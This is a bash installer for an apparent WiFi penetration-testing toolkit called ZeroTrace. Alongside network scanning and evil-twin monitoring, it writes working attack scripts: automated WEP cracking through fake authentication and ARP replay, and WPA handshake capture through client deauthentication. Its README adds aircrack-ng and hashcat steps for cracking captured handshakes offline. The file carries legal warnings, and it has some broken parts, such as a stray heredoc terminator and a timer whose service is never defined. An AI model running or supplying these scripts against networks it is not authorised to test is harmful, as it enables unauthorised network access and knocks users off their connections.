#!/bin/bash
# ZeroTrace - WiFi Penetration Testing Toolkit
# Automated setup for scanning and analyzing poorly secured wireless networks

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
}

error() {
    echo -e "${RED}[ERROR] $1${NC}" >&2
}

success() {
    echo -e "${GREEN}[SUCCESS] $1${NC}"
}

warning() {
    echo -e "${YELLOW}[WARNING] $1${NC}"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    error "This script must be run as root"
    exit 1
fi

log "Starting ZeroTrace WiFi Penetration Testing Toolkit installation..."

# Check for compatible WiFi adapter
check_wifi_adapter() {
    log "Checking for compatible WiFi adapters..."

    # List wireless interfaces
    INTERFACES=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*')

    if [[ -z "$INTERFACES" ]]; then
        error "No wireless interfaces found. Please connect a compatible WiFi adapter."
        error "Recommended: Alfa AWUS036N, TP-Link TL-WN722N, or Raspberry Pi with built-in WiFi"
        exit 1
    fi

    success "Found wireless interfaces: $INTERFACES"

    # Check for monitor mode capability
    for iface in $INTERFACES; do
        if iw list 2>/dev/null | grep -A 10 "$iface" | grep -q "monitor"; then
            success "Interface $iface supports monitor mode"
            MONITOR_CAPABLE=true
            break
        fi
    done

    if [[ "$MONITOR_CAPABLE" != true ]]; then
        warning "No monitor mode capable interface found. Limited functionality available."
    fi
}

# Install required packages
log "Installing WiFi penetration testing tools..."
apt update

# Core WiFi tools
apt install -y aircrack-ng reaver bully pixiewps hashcat hcxdumptool hcxpcaptool

# Additional analysis tools
apt install -y wireshark-common tshark tcpdump kismet

# Python dependencies for advanced tools
apt install -y python3-scapy python3-pip

# Install additional Python tools
pip3 install scapy wifi

# Create WiFi toolkit directory
WIFI_DIR="/opt/zerotrace-wifi"
mkdir -p "$WIFI_DIR"
chmod 755 "$WIFI_DIR"

# Create automated WiFi scanning script
log "Creating WiFi scanning and analysis toolkit..."

cat > "$WIFI_DIR/wifi-scan.sh" << 'EOF'
#!/bin/bash
# ZeroTrace WiFi Network Scanner
# Scans for poorly secured wireless networks

SCAN_DURATION=${1:-30}
OUTPUT_DIR="/var/log/zerotrace/wifi-scans"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p "$OUTPUT_DIR"

echo "Starting WiFi scan for $SCAN_DURATION seconds..."
echo "Results will be saved to: $OUTPUT_DIR/wifi_scan_$TIMESTAMP.txt"
echo ""

# Find wireless interface
INTERFACE=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*' | head -1)

if [[ -z "$INTERFACE" ]]; then
    echo "ERROR: No wireless interface found"
    exit 1
fi

echo "Using interface: $INTERFACE"

# Put interface in monitor mode
airmon-ng check kill
airmon-ng start "$INTERFACE"
MON_INTERFACE="${INTERFACE}mon"

# Perform scan
timeout "$SCAN_DURATION" airodump-ng "$MON_INTERFACE" -w "$OUTPUT_DIR/scan_$TIMESTAMP" --output-format csv

# Clean up
airmon-ng stop "$MON_INTERFACE"
service NetworkManager restart

# Analyze results
echo ""
echo "=== SCAN RESULTS ==="
echo "Timestamp: $(date)"
echo "Duration: ${SCAN_DURATION}s"
echo ""

# Parse CSV output
if [[ -f "$OUTPUT_DIR/scan_$TIMESTAMP-01.csv" ]]; then
    echo "=== ACCESS POINTS FOUND ==="
    grep -E "^[^,]*," "$OUTPUT_DIR/scan_$TIMESTAMP-01.csv" | while IFS=',' read -r bssid first_time last_time channel speed privacy cipher auth power beacons iv lan_ip lan_ip2 essid key; do
        if [[ "$bssid" != "BSSID" && -n "$essid" ]]; then
            echo "ESSID: $essid"
            echo "BSSID: $bssid"
            echo "Channel: $channel"
            echo "Privacy: $privacy"
            echo "Power: $power"
            echo "Encryption: $cipher"
            echo ""

            # Flag poorly secured networks
            if [[ "$privacy" == "OPN" ]]; then
                echo "🚨 VULNERABILITY: OPEN NETWORK (No encryption!)"
            elif [[ "$privacy" == "WEP" ]]; then
                echo "🚨 VULNERABILITY: WEP ENCRYPTION (Easily cracked!)"
            elif [[ "$privacy" == "WPA" && "$cipher" == "TKIP" ]]; then
                echo "⚠️  WEAKNESS: WPA with TKIP (Vulnerable to attacks)"
            fi
            echo "---"
        fi
    done > "$OUTPUT_DIR/wifi_scan_$TIMESTAMP.txt"

    echo "Detailed results saved to: $OUTPUT_DIR/wifi_scan_$TIMESTAMP.txt"
else
    echo "No scan results found"
fi

echo ""
echo "=== SUMMARY ==="
TOTAL_NETWORKS=$(grep -c "ESSID:" "$OUTPUT_DIR/wifi_scan_$TIMESTAMP.txt" 2>/dev/null || echo "0")
OPEN_NETWORKS=$(grep -c "OPN" "$OUTPUT_DIR/scan_$TIMESTAMP-01.csv" 2>/dev/null || echo "0")
WEP_NETWORKS=$(grep -c "WEP" "$OUTPUT_DIR/scan_$TIMESTAMP-01.csv" 2>/dev/null || echo "0")

echo "Total networks found: $TOTAL_NETWORKS"
echo "Open networks: $OPEN_NETWORKS"
echo "WEP networks: $WEP_NETWORKS"

if [[ $OPEN_NETWORKS -gt 0 || $WEP_NETWORKS -gt 0 ]]; then
    echo ""
    echo "🚨 SECURITY CONCERNS DETECTED!"
    echo "Found $OPEN_NETWORKS open and $WEP_NETWORKS WEP networks"
    echo "These networks have significant security vulnerabilities"
fi
EOF

chmod +x "$WIFI_DIR/wifi-scan.sh"

# Create WEP cracking automation
cat > "$WIFI_DIR/wep-crack.sh" << 'EOF'
#!/bin/bash
# ZeroTrace WEP Cracking Automation
# Automated WEP network cracking (for educational/testing purposes only)

BSSID="$1"
CHANNEL="$2"
ESSID="$3"

if [[ -z "$BSSID" || -z "$CHANNEL" || -z "$ESSID" ]]; then
    echo "Usage: $0 <BSSID> <CHANNEL> <ESSID>"
    echo "Example: $0 00:11:22:33:44:55 6 MyNetwork"
    echo ""
    echo "Use wifi-scan.sh first to find vulnerable networks"
    exit 1
fi

OUTPUT_DIR="/var/log/zerotrace/wifi-scans"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "🚨 WARNING: WEP cracking is for educational purposes only!"
echo "Ensure you have permission to test this network"
echo ""
read -p "Continue? (y/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
fi

INTERFACE=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*' | head -1)
MON_INTERFACE="${INTERFACE}mon"

echo "Starting WEP crack against: $ESSID ($BSSID)"
echo "Channel: $CHANNEL"
echo ""

# Put interface in monitor mode
airmon-ng check kill
airmon-ng start "$INTERFACE" "$CHANNEL"
MON_INTERFACE="${INTERFACE}mon"

# Capture IVs
echo "Capturing IVs... (This may take several minutes)"
timeout 300 airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT_DIR/wep_$TIMESTAMP" "$MON_INTERFACE" &
AIRODUMP_PID=$!

# Start fake authentication
sleep 2
aireplay-ng -1 0 -a "$BSSID" -h "$(macchanger -s "$MON_INTERFACE" | grep Current | cut -d' ' -f3)" "$MON_INTERFACE"

# ARP replay attack
aireplay-ng -3 -b "$BSSID" -h "$(macchanger -s "$MON_INTERFACE" | grep Current | cut -d' ' -f3)" "$MON_INTERFACE" &
ARP_PID=$!

# Wait for enough IVs
echo "Waiting for IVs... (Need at least 20,000 for reliable crack)"
IV_COUNT=0
while [[ $IV_COUNT -lt 20000 ]]; do
    sleep 10
    if [[ -f "$OUTPUT_DIR/wep_$TIMESTAMP-01.csv" ]]; then
        IV_COUNT=$(grep "$BSSID" "$OUTPUT_DIR/wep_$TIMESTAMP-01.csv" | cut -d',' -f11 | sed 's/^[ \t]*//')
        IV_COUNT=${IV_COUNT:-0}
        echo "IVs captured: $IV_COUNT"
    fi
done

# Kill capture processes
kill $AIRODUMP_PID $ARP_PID 2>/dev/null

# Attempt to crack
echo "Attempting to crack WEP key..."
aircrack-ng -b "$BSSID" "$OUTPUT_DIR/wep_$TIMESTAMP-01.cap"

# Clean up
airmon-ng stop "$MON_INTERFACE"
service NetworkManager restart

echo "WEP cracking attempt completed"
echo "Check output above for the cracked key"
EOF

chmod +x "$WIFI_DIR/wep-crack.sh"

# Create WPA handshake capture script
cat > "$WIFI_DIR/wpa-handshake.sh" << 'EOF'
#!/bin/bash
# ZeroTrace WPA Handshake Capture
# Captures WPA handshakes for offline cracking

BSSID="$1"
CHANNEL="$2"
ESSID="$3"

if [[ -z "$BSSID" || -z "$CHANNEL" || -z "$ESSID" ]]; then
    echo "Usage: $0 <BSSID> <CHANNEL> <ESSID>"
    echo "Example: $0 00:11:22:33:44:55 6 MyNetwork"
    echo ""
    echo "Use wifi-scan.sh first to find target networks"
    exit 1
fi

OUTPUT_DIR="/var/log/zerotrace/wifi-scans"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "Starting WPA handshake capture for: $ESSID ($BSSID)"
echo "Channel: $CHANNEL"
echo ""

INTERFACE=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*' | head -1)
MON_INTERFACE="${INTERFACE}mon"

# Put interface in monitor mode
airmon-ng check kill
airmon-ng start "$INTERFACE" "$CHANNEL"
MON_INTERFACE="${INTERFACE}mon"

# Start capture
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT_DIR/wpa_$TIMESTAMP" "$MON_INTERFACE" &
AIRODUMP_PID=$!

# Wait for clients
echo "Waiting for clients to connect..."
sleep 5

# Deauthenticate clients to force reconnect and capture handshake
echo "Sending deauthentication packets..."
aireplay-ng -0 5 -a "$BSSID" "$MON_INTERFACE"

# Monitor for handshake
echo "Monitoring for WPA handshake..."
sleep 10

# Check if handshake captured
if aircrack-ng "$OUTPUT_DIR/wpa_$TIMESTAMP-01.cap" | grep -q "WPA handshake"; then
    echo "✅ WPA handshake captured successfully!"
    echo "File: $OUTPUT_DIR/wpa_$TIMESTAMP-01.cap"
    echo ""
    echo "To crack offline:"
    echo "aircrack-ng -w wordlist.txt $OUTPUT_DIR/wpa_$TIMESTAMP-01.cap"
else
    echo "❌ No WPA handshake captured"
    echo "Try again when clients are actively connecting"
fi

# Clean up
kill $AIRODUMP_PID 2>/dev/null
airmon-ng stop "$MON_INTERFACE"
service NetworkManager restart
EOF

chmod +x "$WIFI_DIR/wpa-handshake.sh"

# Create convenience wrapper scripts
log "Creating convenience scripts..."

cat > /usr/local/bin/zerotrace-wifi-scan << 'EOF'
#!/bin/bash
echo "ZeroTrace WiFi Network Scanner"
echo "=============================="
sudo /opt/zerotrace-wifi/wifi-scan.sh "$@"
EOF

chmod +x /usr/local/bin/zerotrace-wifi-scan

cat > /usr/local/bin/zerotrace-wifi-monitor << 'EOF'
#!/bin/bash
echo "ZeroTrace Continuous WiFi Monitor"
echo "================================="
echo "Starting continuous monitoring... (Ctrl+C to stop)"
echo "Alerts will be logged to: /var/log/zerotrace/wifi-alerts.log"
echo ""
sudo /opt/zerotrace-wifi/wifi-monitor.sh
EOF

chmod +x /usr/local/bin/zerotrace-wifi-monitor

cat > /usr/local/bin/zerotrace-wifi-analyze << 'EOF'
#!/bin/bash
echo "ZeroTrace WiFi Network Analysis"
echo "==============================="
sudo /opt/zerotrace-wifi/wifi-analyze.sh
EOF

chmod +x /usr/local/bin/zerotrace-wifi-analyze

cat > /usr/local/bin/zerotrace-wep-crack << 'EOF'
#!/bin/bash
echo "ZeroTrace WEP Cracking Tool"
echo "==========================="
sudo /opt/zerotrace-wifi/wep-crack.sh "$@"
EOF

chmod +x /usr/local/bin/zerotrace-wep-crack

cat > /usr/local/bin/zerotrace-wpa-capture << 'EOF'
#!/bin/bash
echo "ZeroTrace WPA Handshake Capture"
echo "==============================="
sudo /opt/zerotrace-wifi/wpa-handshake.sh "$@"
EOF

chmod +x /usr/local/bin/zerotrace-wpa-capture

# Create continuous WiFi monitoring system
log "Creating continuous WiFi monitoring and alert system..."

cat > "$WIFI_DIR/wifi-monitor.sh" << 'EOF'
#!/bin/bash
# ZeroTrace Continuous WiFi Monitor
# Monitors all WiFi networks and alerts on suspicious activity

LOG_DIR="/var/log/zerotrace"
WIFI_LOG="$LOG_DIR/wifi-monitor.log"
ALERT_LOG="$LOG_DIR/wifi-alerts.log"
NETWORK_DB="$LOG_DIR/wifi-networks.db"

mkdir -p "$LOG_DIR"

# Initialize network database if it doesn't exist
if [[ ! -f "$NETWORK_DB" ]]; then
    echo "# ZeroTrace WiFi Network Database" > "$NETWORK_DB"
    echo "# Format: timestamp,bssid,essid,channel,encryption,power,last_seen,flags" >> "$NETWORK_DB"
fi

echo "$(date): Starting continuous WiFi monitoring" >> "$WIFI_LOG"

while true; do
    TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)

    # Quick scan (10 seconds)
    /usr/local/bin/zerotrace-wifi-scan 10 > /tmp/wifi_scan_current.txt 2>/dev/null

    # Analyze results
    if [[ -f "/var/log/zerotrace/wifi-scans/wifi_scan_${TIMESTAMP:0:15}*.txt" ]]; then
        SCAN_FILE=$(ls -t /var/log/zerotrace/wifi-scans/wifi_scan_${TIMESTAMP:0:15}*.txt 2>/dev/null | head -1)

        if [[ -f "$SCAN_FILE" ]]; then
            # Extract network data
            grep "ESSID:" "$SCAN_FILE" | while read -r line; do
                if [[ "$line" == *"ESSID:"* ]]; then
                    # Parse network information
                    NETWORK_INFO=$(echo "$line" | sed 's/.*ESSID: //' | head -1)
                    BSSID=$(grep -A 10 "$line" "$SCAN_FILE" | grep "BSSID:" | head -1 | sed 's/.*BSSID: //')
                    CHANNEL=$(grep -A 10 "$line" "$SCAN_FILE" | grep "Channel:" | head -1 | sed 's/.*Channel: //')
                    ENCRYPTION=$(grep -A 10 "$line" "$SCAN_FILE" | grep "Privacy:" | head -1 | sed 's/.*Privacy: //')
                    POWER=$(grep -A 10 "$line" "$SCAN_FILE" | grep "Power:" | head -1 | sed 's/.*Power: //')

                    if [[ -n "$BSSID" && -n "$NETWORK_INFO" ]]; then
                        # Check if network is new or changed
                        EXISTING=$(grep "$BSSID" "$NETWORK_DB")
                        if [[ -z "$EXISTING" ]]; then
                            # New network detected
                            echo "$(date),$BSSID,$NETWORK_INFO,$CHANNEL,$ENCRYPTION,$POWER,$TIMESTAMP,NEW" >> "$NETWORK_DB"
                            echo "$(date): NEW NETWORK: $NETWORK_INFO ($BSSID) - $ENCRYPTION" >> "$WIFI_LOG"

                            # Alert on high-risk networks
                            if [[ "$ENCRYPTION" == "OPN" ]]; then
                                echo "$(date): 🚨 ALERT: Open network detected - $NETWORK_INFO ($BSSID)" >> "$ALERT_LOG"
                            elif [[ "$ENCRYPTION" == "WEP" ]]; then
                                echo "$(date): 🚨 ALERT: WEP network detected - $NETWORK_INFO ($BSSID)" >> "$ALERT_LOG"
                            fi
                        else
                            # Update last seen
                            sed -i "s|.*$BSSID.*|$TIMESTAMP,$BSSID,$NETWORK_INFO,$CHANNEL,$ENCRYPTION,$POWER,$TIMESTAMP,KNOWN|" "$NETWORK_DB"
                        fi

                        # Check for suspicious patterns
                        ROGUE_AP=$(grep -c "$BSSID" "$NETWORK_DB")
                        if [[ $ROGUE_AP -gt 3 ]]; then
                            echo "$(date): ⚠️  WARNING: Possible rogue AP - $BSSID seen on multiple channels" >> "$ALERT_LOG"
                        fi

                        # Evil twin detection (same ESSID, different BSSID)
                        TWIN_COUNT=$(grep "$NETWORK_INFO" "$NETWORK_DB" | grep -v "$BSSID" | wc -l)
                        if [[ $TWIN_COUNT -gt 0 ]]; then
                            echo "$(date): 🚨 ALERT: Possible evil twin - Multiple BSSIDs for $NETWORK_INFO" >> "$ALERT_LOG"
                        fi
                    fi
                fi
            done

            # Clean up old scan files (keep last 10)
            ls -t /var/log/zerotrace/wifi-scans/wifi_scan_*.txt 2>/dev/null | tail -n +11 | xargs rm -f 2>/dev/null || true
        fi
    fi

    # Generate summary every hour
    if [[ $(date +%M) == "00" ]]; then
        TOTAL_NETWORKS=$(grep -c "^[0-9]" "$NETWORK_DB")
        OPEN_NETWORKS=$(grep "OPN" "$NETWORK_DB" | wc -l)
        WEP_NETWORKS=$(grep "WEP" "$NETWORK_DB" | wc -l)
        NEW_TODAY=$(grep "$(date +%Y-%m-%d)" "$NETWORK_DB" | grep "NEW" | wc -l)

        echo "$(date): SUMMARY - Total: $TOTAL_NETWORKS, Open: $OPEN_NETWORKS, WEP: $WEP_NETWORKS, New today: $NEW_TODAY" >> "$WIFI_LOG"

        # Daily security report
        if [[ $(date +%H) == "23" ]]; then
            echo "$(date): DAILY SECURITY REPORT" >> "$ALERT_LOG"
            echo "Total networks in database: $TOTAL_NETWORKS" >> "$ALERT_LOG"
            echo "Open networks: $OPEN_NETWORKS" >> "$ALERT_LOG"
            echo "WEP networks: $WEP_NETWORKS" >> "$ALERT_LOG"
            echo "New networks today: $NEW_TODAY" >> "$ALERT_LOG"
            echo "---" >> "$ALERT_LOG"
        fi
    fi

    # Wait before next scan (5 minutes)
    sleep 300
done
EOF

chmod +x "$WIFI_DIR/wifi-monitor.sh"

# Create WiFi analysis script
cat > "$WIFI_DIR/wifi-analyze.sh" << 'EOF'
#!/bin/bash
# ZeroTrace WiFi Network Analysis
# Comprehensive analysis of all detected networks

DB_FILE="/var/log/zerotrace/wifi-networks.db"
REPORT_DIR="/var/log/zerotrace/reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p "$REPORT_DIR"

echo "ZeroTrace WiFi Network Analysis Report"
echo "======================================"
echo "Generated: $(date)"
echo ""

if [[ ! -f "$DB_FILE" ]]; then
    echo "No network database found. Run wifi-monitor.sh first."
    exit 1
fi

# Total statistics
TOTAL_NETWORKS=$(grep -c "^[0-9]" "$DB_FILE")
UNIQUE_SSIDS=$(cut -d',' -f3 "$DB_FILE" | sort | uniq | wc -l)
OPEN_NETWORKS=$(grep "OPN" "$DB_FILE" | wc -l)
WEP_NETWORKS=$(grep "WEP" "$DB_FILE" | wc -l)
WPA_NETWORKS=$(grep "WPA" "$DB_FILE" | wc -l)
WPA2_NETWORKS=$(grep "WPA2" "$DB_FILE" | wc -l)

echo "NETWORK STATISTICS"
echo "=================="
echo "Total networks detected: $TOTAL_NETWORKS"
echo "Unique SSIDs: $UNIQUE_SSIDS"
echo "Open networks (no encryption): $OPEN_NETWORKS"
echo "WEP networks (vulnerable): $WEP_NETWORKS"
echo "WPA networks: $WPA_NETWORKS"
echo "WPA2 networks: $WPA2_NETWORKS"
echo ""

# Channel analysis
echo "CHANNEL UTILIZATION"
echo "==================="
echo "Channel | Networks | Security Risk"
echo "--------|----------|--------------"
for channel in {1..14}; do
    COUNT=$(grep ",$channel," "$DB_FILE" | wc -l)
    RISK="Low"
    if [[ $COUNT -gt 5 ]]; then RISK="High (Congestion)"; fi

    printf "%-8s| %-9s| %s\n" "$channel" "$COUNT" "$RISK"
done
echo ""

# Most common encryption types
echo "ENCRYPTION ANALYSIS"
echo "==================="
echo "Encryption | Count | Risk Level"
echo "-----------|-------|-----------"
echo "Open       | $OPEN_NETWORKS    | CRITICAL"
echo "WEP        | $WEP_NETWORKS    | HIGH"
echo "WPA        | $WPA_NETWORKS    | MEDIUM"
echo "WPA2       | $WPA2_NETWORKS   | LOW"
echo ""

# Top 10 most powerful signals (potential rogue APs)
echo "STRONGEST SIGNALS (Potential Rogue AP Indicators)"
echo "=================================================="
grep "^[0-9]" "$DB_FILE" | sort -t',' -k6 -nr | head -10 | while IFS=',' read -r ts bssid essid ch enc pwr last flags; do
    printf "ESSID: %-20s BSSID: %s Power: %s\n" "$essid" "$bssid" "$pwr"
done
echo ""

# Networks not seen recently (decommissioned?)
echo "STALE NETWORKS (Not seen in 30+ days)"
echo "======================================"
THIRTY_DAYS_AGO=$(date -d '30 days ago' +%Y%m%d)
grep "^[0-9]" "$DB_FILE" | while IFS=',' read -r ts bssid essid ch enc pwr last flags; do
    LAST_SEEN=${last:0:8}
    if [[ "$LAST_SEEN" < "$THIRTY_DAYS_AGO" ]]; then
        printf "ESSID: %-20s Last seen: %s\n" "$essid" "$last"
    fi
done
echo ""

# Evil twin analysis
echo "EVIL TWIN ANALYSIS"
echo "=================="
cut -d',' -f3 "$DB_FILE" | sort | uniq -c | sort -nr | while read -r count ssid; do
    if [[ $count -gt 1 ]]; then
        BSSIDS=$(grep "$ssid" "$DB_FILE" | cut -d',' -f2 | tr '\n' ' ')
        echo "SSID: $ssid (appears $count times)"
        echo "BSSIDs: $BSSIDS"
        echo ""
    fi
done

# Security recommendations
echo "SECURITY RECOMMENDATIONS"
echo "========================"

if [[ $OPEN_NETWORKS -gt 0 ]]; then
    echo "🚨 CRITICAL: $OPEN_NETWORKS open networks detected!"
    echo "   - Avoid connecting to open WiFi networks"
    echo "   - Use VPN when on public WiFi"
    echo ""
fi

if [[ $WEP_NETWORKS -gt 0 ]]; then
    echo "🚨 HIGH RISK: $WEP_NETWORKS WEP networks detected!"
    echo "   - WEP encryption is easily cracked"
    echo "   - Avoid WEP networks entirely"
    echo ""
fi

if [[ $UNIQUE_SSIDS -lt $TOTAL_NETWORKS ]]; then
    echo "⚠️  MEDIUM RISK: Evil twin possibility detected"
    echo "   - Multiple access points with same SSID found"
    echo "   - Verify legitimate network MAC addresses"
    echo ""
fi

echo "Report saved to: $REPORT_DIR/wifi_analysis_$TIMESTAMP.txt"

# Save report
cat > "$REPORT_DIR/wifi_analysis_$TIMESTAMP.txt" << EOF
ZeroTrace WiFi Network Analysis Report
Generated: $(date)

NETWORK STATISTICS
Total networks detected: $TOTAL_NETWORKS
Unique SSIDs: $UNIQUE_SSIDS
Open networks: $OPEN_NETWORKS
WEP networks: $WEP_NETWORKS
WPA networks: $WPA_NETWORKS
WPA2 networks: $WPA2_NETWORKS

SECURITY SUMMARY
Open networks (CRITICAL): $OPEN_NETWORKS
WEP networks (HIGH): $WEP_NETWORKS
Potential evil twins: $(($TOTAL_NETWORKS - $UNIQUE_SSIDS))

EOF
EOF

chmod +x "$WIFI_DIR/wifi-analyze.sh"

# Create systemd services for continuous monitoring
cat > /etc/systemd/system/zerotrace-wifi-monitor.service << 'EOF'
[Unit]
Description=ZeroTrace Continuous WiFi Monitor
After=network.target

[Service]
Type=simple
ExecStart=/opt/zerotrace-wifi/wifi-monitor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Update periodic scan timer to be more frequent
cat > /etc/systemd/system/zerotrace-wifi-scan.timer << 'EOF'
[Unit]
Description=Run ZeroTrace WiFi Scan daily
Requires=zerotrace-wifi-scan.service

[Timer]
OnCalendar=daily
Persistent=true

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload

# Create documentation
cat > "$WIFI_DIR/README.md" << 'EOF'
# ZeroTrace WiFi Penetration Testing Toolkit

This toolkit provides automated scanning and analysis of wireless networks to identify security vulnerabilities.

## ⚠️ Legal & Ethical Warning

- Only test networks you own or have explicit permission to test
- WEP cracking and WPA attacks are illegal without authorization
- This tool is for educational and security auditing purposes only
- Comply with local laws and regulations

## Quick Start

### Basic Network Scanning
```bash
# Scan for 30 seconds (default)
zerotrace-wifi-scan

# Scan for custom duration
zerotrace-wifi-scan 60
```

### WEP Network Cracking (Educational Only)
```bash
# Find vulnerable networks first
zerotrace-wifi-scan

# Crack WEP network (replace with actual values)
zerotrace-wep-crack 00:11:22:33:44:55 6 VulnerableNetwork
```

### WPA Handshake Capture
```bash
# Capture WPA handshake for offline cracking
zerotrace-wpa-capture 00:11:22:33:44:55 6 TargetNetwork
```

## Automated Scanning

Enable weekly automated scans:
```bash
sudo systemctl enable zerotrace-wifi-scan.timer
sudo systemctl start zerotrace-wifi-scan.timer
```

## Results Location

- Scan results: `/var/log/zerotrace/wifi-scans/`
- Real-time monitoring: `tail -f /var/log/zerotrace/wifi-scans/wifi_scan_*.txt`

## Security Vulnerabilities Detected

The scanner automatically flags:
- **Open Networks**: No encryption at all
- **WEP Networks**: Easily cracked encryption
- **WPA/TKIP**: Vulnerable to attack
- **Weak Signals**: Potentially rogue access points

## Troubleshooting

### No Wireless Interfaces
```
Error: No wireless interfaces found
```
- Connect a compatible WiFi adapter (Alfa AWUS036N recommended)
- Ensure adapter is recognized: `iwconfig`

### Monitor Mode Not Supported
```
No monitor mode capable interface found
```
- Some built-in WiFi chips don't support monitor mode
- Use external USB WiFi adapter with chipset like Atheros AR9271

### Permission Denied
- Run commands with `sudo`
- Ensure user is in appropriate groups

## Advanced Usage

### Custom Wordlist for WPA Cracking
```bash
# Use rockyou.txt or custom wordlist
aircrack-ng -w /path/to/wordlist.txt handshake.cap
```

### Hashcat for GPU-Accelerated Cracking
```bash
# Convert capture to hashcat format
hcxpcaptool -o hash.hc22000 handshake.cap

# Crack with GPU
hashcat -m 22000 hash.hc22000 wordlist.txt
```

## Compatible Hardware

### Recommended Adapters
- Alfa AWUS036N (Atheros AR9271 chipset)
- TP-Link TL-WN722N v1 (Atheros AR9271)
- Panda PAU09 (Atheros AR9271)

### Raspberry Pi Built-in WiFi
- Pi 3/4: Limited monitor mode support
- External adapter recommended for full functionality
EOF

# Make scripts executable
chmod +x "$WIFI_DIR"/*.sh

# Check WiFi adapter compatibility
check_wifi_adapter

# Integrate with existing threat detection system
log "Integrating WiFi monitoring with threat detection system..."

# Add WiFi alerts to main threat monitoring
THREAT_MONITOR_SCRIPT="/usr/local/bin/zerotrace-monitor.sh"

if [[ -f "$THREAT_MONITOR_SCRIPT" ]]; then
    # Add WiFi monitoring to existing threat monitor
    sed -i '/# Check Tor connectivity/a \
# Check for WiFi security alerts\
WIFI_ALERTS=$(tail -10 /var/log/zerotrace/wifi-alerts.log 2>/dev/null | grep -c "ALERT" || echo "0")\
if [[ $WIFI_ALERTS -gt 0 ]]; then\
    echo "$(date): WiFi security alerts detected ($WIFI_ALERTS)" >> "$THREAT_LOG"\
fi' "$THREAT_MONITOR_SCRIPT"

    log "✓ WiFi alerts integrated with main threat monitoring"
fi

success "WiFi Penetration Testing Toolkit installed successfully!"
log "Features enabled:"
log "  ✓ Automated network scanning with vulnerability detection"
log "  ✓ Continuous monitoring with real-time alerts"
log "  ✓ Comprehensive network analysis and reporting"
log "  ✓ Evil twin and rogue AP detection"
log "  ✓ WEP cracking automation (educational)"
log "  ✓ WPA handshake capture tools"
log "  ✓ Daily automated security scans"
log "  ✓ Integration with threat detection system"
log "  ✓ Comprehensive logging and reporting"

warning "⚠️  LEGAL WARNING: Only test networks you own or have permission to test"
warning "WEP cracking and unauthorized access are illegal activities"

log "Usage commands:"
log "  zerotrace-wifi-scan     # Scan networks (30s default)"
log "  zerotrace-wifi-monitor  # Continuous monitoring (Ctrl+C to stop)"
log "  zerotrace-wifi-analyze  # Comprehensive network analysis"
log "  zerotrace-wep-crack     # Crack WEP networks (educational)"
log "  zerotrace-wpa-capture   # Capture WPA handshakes"
log ""
log "Monitoring:"
log "  tail -f /var/log/zerotrace/wifi-alerts.log    # Real-time alerts"
log "  tail -f /var/log/zerotrace/wifi-monitor.log   # Monitor log"
log ""
log "Reports: /var/log/zerotrace/reports/"
log "Database: /var/log/zerotrace/wifi-networks.db"
log "Docs: $WIFI_DIR/README.md"

warning "Reboot recommended for full driver integration"
warning "Start continuous monitoring: sudo systemctl start zerotrace-wifi-monitor"